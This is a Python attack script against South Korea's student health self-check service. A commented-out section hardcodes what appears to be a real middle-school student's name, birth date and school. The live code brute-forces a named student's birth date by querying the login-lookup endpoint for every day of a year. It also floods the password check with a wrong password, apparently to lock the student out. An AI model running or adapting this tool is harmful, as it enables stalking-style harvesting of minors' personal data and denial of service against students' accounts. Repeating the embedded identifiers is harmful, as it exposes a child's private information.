# import requests
# import json

# import hcskr
# from hcskr.transkey import mTransKey
# from hcskr.mapping import schoolinfo
# from hcskr.mapping import encrypt

# import asyncio


# name = '김건우'
# birth = '070208'
# area = '서울'
# school_name = '장승중'
# school_level = '중학교'
# info = {}


# def generate_url(school_url, end_point):
#       return f'https://{school_url}hcs.eduro.go.kr{end_point}'


# def search_school(area, school_name, school_level):
      # info = schoolinfo(area, school_level)

#       data = {
#             'ltcnScCode': info['schoolcode'],
#             'schulCrseScCode': info['schoollevel'],
#             'orgName': school_name,
#             'loginType': 'school'
#       }

#       res = requests.get(
#             generate_url('', '/v2/searchSchool'),
#             data
#       ).json()

#       return {
#             'res': res,
#             'info': info
#       }


# def login(name, birth, org_code, info):
#      data = {
#            'birthday': encrypt(birth),
#            'loginType': 'school',
#            'name': encrypt(name),
#            'orgCode': org_code,
#            'stdntPNo': None
#      }

#      res = requests.post(
#            generate_url(info['schoolurl'], '/v2/findUser'),
#            json=data
#      ).json()

#      return res


# async def main(token):
#       mtk = mTransKey("https://hcs.eduro.go.kr/transkeyServlet")
#       pw_pad = await mtk.new_keypad("number", "password", "password", "password")
#       encrypted = pw_pad.encrypt_password(password, mtk.decInitTime)
#       hm = mtk.hmac_digest(encrypted.encode())


#       res = requests.post(
#             f'https://{"sen"}hcs.eduro.go.kr/v2/validatePassword',
#             headers={
#                   "Referer": "https://hcs.eduro.go.kr/",
#                   "Authorization": token,
#                   "X-Requested-With": "XMLHttpRequest",
#                   "Content-Type": "application/json;charset=utf-8",
#             },
#             json={
#                   "password": json.dumps(
#                         {
#                               "raon": [
#                                     {
#                                           "id": "password",
#                                           "enc": encrypted,
#                                           "hmac": hm,
#                                           "keyboardType": "number",
#                                           "keyIndex": mtk.crypto.rsa_encrypt(b"32"),
#                                           "fieldType": "password",
#                                           "seedKey": mtk.crypto.get_encrypted_key(),
#                                           "initTime": mtk.initTime,
#                                           "ExE2E": "false",
#                                     }
#                               ]
#                         }
#                   ),
#                   "deviceUuid": "",
#                   "makeSession": True,
#             }
#       )

#       print(res)
#       # res = await send_hcsreq(
#       #       headers={
#       #             "Referer": "https://hcs.eduro.go.kr/",
#       #             "Authorization": token,
#       #             "X-Requested-With": "XMLHttpRequest",
#       #             "Content-Type": "application/json;charset=utf-8",
#       #       },
#       #       endpoint="/v2/validatePassword",
#       #       school=info["schoolurl"],
#       #       json={
#       #             "password": json.dumps(
#       #                   {
#       #                         "raon": [
#       #                               {
#       #                                     "id": "password",
#       #                                     "enc": encrypted,
#       #                                     "hmac": hm,
#       #                                     "keyboardType": "number",
#       #                                     "keyIndex": mtk.crypto.rsa_encrypt(b"32"),
#       #                                     "fieldType": "password",
#       #                                     "seedKey": mtk.crypto.get_encrypted_key(),
#       #                                     "initTime": mtk.initTime,
#       #                                     "ExE2E": "false",
#       #                               }
#       #                         ]
#       #                   }
#       #             ),
#       #             "deviceUuid": "",
#       #             "makeSession": True,
#       #             },
#       #             session=session,
#       #       )


# result = search_school('서울', '장승중', '중학교')
# school_list = result['res']['schulList']
# info = result['info']

# for i, school in enumerate(school_list):
#       print(f'{i}: {school}')

# choice = int(input('Which School: '))
# org_code = school_list[choice]['orgCode']

# token = login(name, birth, org_code, info)['token']

# asyncio.get_event_loop().run_until_complete(main(token))

import time
import hcskr
from hcskr.mapping import schoolinfo, encrypt
import requests

import asyncio
from login import login
from validate_password import encrypt_password
from validate_password import validate_password


def find_birth():
      name = str(input('Name: '))
      birth_year = str(input('Birth Year: '))
      area = str(input('Area: '))
      school_name = str(input('School Name: '))
      school_level = str(input('School Level: '))

      info = schoolinfo(area, school_level)

      data = {
            'ltcnScCode': info['schoolcode'],
            'schulCrseScCode': info['schoollevel'],
            'orgName': school_name,
            'loginType': 'school'
      }

      schulList = requests.get(
            'https://hcs.eduro.go.kr/v2/searchSchool',
            data
      ).json()['schulList']

      for i, school in enumerate(schulList):
            print(f'{i} : {school}\n')

      choice = int(input('Choice : '))

      org_code = schulList[choice]['orgCode']

      result = []

      for month in range(12):
            for day in range(31):
                  data = {
                  'birthday': encrypt(f'{str(birth_year).zfill(2)}{str(month + 1).zfill(2)}{str(day + 1).zfill(2)}'),
                  'loginType': 'school',
                  'name': encrypt(name),
                  'orgCode': org_code,
                  'stdntPNo': None
                  }

                  res = requests.post(
                        f'https://{info["schoolurl"]}hcs.eduro.go.kr/v2/findUser',
                        json=data
                  ).json()

                  if 'token' in res.keys():
                        result.append(f'{str(birth_year).zfill(2)}{str(month + 1).zfill(2)}{str(day + 1).zfill(2)}')

                  print(f'\r{round((((day + 1) + (month) * 31)/(12 * 31)) * 100, 2)}%', end='')

      print('')
      for r in result:
            print(r)


def block():
      name = str(input('Name: '))
      birth = str(input('Birth: '))
      area = str(input('Area: '))
      school_name = str(input('School Name: '))
      school_level = str(input('School Level: '))
      test_password = str(input('Test Password: '))
      # 학생 인증 토큰을 token에 저장
      token = login(
            area, school_name, school_level, birth, name
      )['token']
      count = 1
      data = asyncio.get_event_loop().run_until_complete(encrypt_password(test_password))

      while True:
            a = validate_password(token, data)
            if 'data' not in a.keys():
                  print(f'\n[!]Error: { a }')
                  return
            
            print(f'\rBlock {count} time', end='')
            count += 1


choice = int(input('Find Birth(0) or Block(1) : '))

if choice == 0:
      find_birth()
elif choice == 1:
      block()
else:
      print('?')

